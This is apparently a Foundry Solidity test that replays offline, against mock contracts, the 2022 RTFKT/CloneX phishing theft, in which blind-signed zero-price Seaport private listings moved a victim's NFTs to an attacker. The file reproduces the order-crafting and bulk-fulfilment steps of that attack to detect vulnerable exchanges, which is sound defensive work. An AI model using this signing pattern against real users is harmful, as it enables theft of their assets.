// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {MockERC721} from "../src/MockERC721.sol";
import {SeaportBulkExchange} from "../fixtures/signature-phishing/b-incident/SeaportBulkExchange.sol";

/// @title signature-phishing (b) real-incident fixture: RTFKT / CloneX Seaport bulk
///        private-listing theft (2022-12-08).
/// @notice Minimized OFFLINE replay of the path behind the RTFKT airdrop-lure phishing: an
///         unsolicited "RTFKT airdrop" lured the victim to a site that asked them to "sign"
///         what looked like a routine step; it was actually a BULK of Seaport private-listing
///         orders selling the victim's CloneX for 0 ETH to the attacker's taker. A relayer
///         bulk-fulfilled them (Seaport 1.1 fulfillAvailableAdvancedOrders, selector
///         0xa8174404) and the NFTs left the victim one minute after signing - without the
///         victim ever sending a transaction. ~21 CloneX, ~168 ETH (Scam Sniffer). The
///         offerer is a key-derived stand-in: EIP-712 needs a valid signature and the real
///         victim's key is (rightly) not public, so this is a pattern-level reproduction
///         anchored to the on-chain-confirmed incident (see PROVENANCE.md). The verdict is
///         derived from the real outcome (the NFTs changed owner to the attacker's taker and
///         the victim received 0 ETH).
contract RtfktSeaportIncidentTest is Test {
    uint256 constant OFFERER_PK = 0xC10E; // stand-in signer (real victim key is not public)
    address constant TAKER = address(0xC0FDF4); // attacker's "assets taker" (stand-in)
    uint256 constant COLLECTION_SIZE = 5; // several CloneX, signed in one bulk order set

    function _report(string memory target, bool stolen) internal pure {
        console.log(
            string.concat(
                "[signature-phishing] target=", target, " verdict=", stolen ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_rtfktSeaportBulkIncident_isStolen() public {
        MockERC721 nft = new MockERC721();
        SeaportBulkExchange exchange = new SeaportBulkExchange();
        address victim = vm.addr(OFFERER_PK);
        for (uint256 i = 1; i <= COLLECTION_SIZE; i++) {
            nft.mint(victim, i);
        }

        // Routine marketplace setup: the victim had approved the marketplace as an operator
        // (as CloneX holders who ever listed on OpenSea had).
        vm.prank(victim);
        nft.setApprovalForAll(address(exchange), true);

        // The bulk of orders the victim is phished into blind-signing: each "sells" one NFT
        // to the attacker's taker for 0 ETH (a private listing). Nonces increment as each is
        // filled, so they are signed against the sequential nonce the exchange will see.
        uint256 n = COLLECTION_SIZE;
        SeaportBulkExchange.Order[] memory orders = new SeaportBulkExchange.Order[](n);
        uint8[] memory vs = new uint8[](n);
        bytes32[] memory rs = new bytes32[](n);
        bytes32[] memory ss = new bytes32[](n);
        for (uint256 i = 0; i < n; i++) {
            orders[i] = SeaportBulkExchange.Order({
                offerer: victim,
                nftToken: address(nft),
                tokenId: i + 1,
                price: 0, // zero-consideration private listing: the victim is paid nothing
                recipient: TAKER,
                nonce: i, // sequential: order i is valid once i prior orders have filled
                deadline: block.timestamp + 1 hours
            });
            (vs[i], rs[i], ss[i]) = vm.sign(OFFERER_PK, exchange.hashOrder(orders[i]));
        }

        uint256 victimEthBefore = victim.balance;

        // The relayer bulk-fulfills the signed orders; every NFT leaves the victim.
        vm.prank(TAKER);
        uint256 filled = exchange.fulfillAvailableAdvancedOrders(orders, vs, rs, ss);

        uint256 takerHoldings = nft.balanceOf(TAKER);
        bool stolen = (nft.balanceOf(victim) == 0 && takerHoldings == COLLECTION_SIZE);
        _report("rtfkt-seaport-victim", stolen);

        assertEq(filled, COLLECTION_SIZE, "all signed private listings should fill");
        assertTrue(stolen, "incident replay should move the whole collection to the taker");
        assertEq(victim.balance, victimEthBefore, "victim received 0 ETH (private listing at price 0)");
    }
}
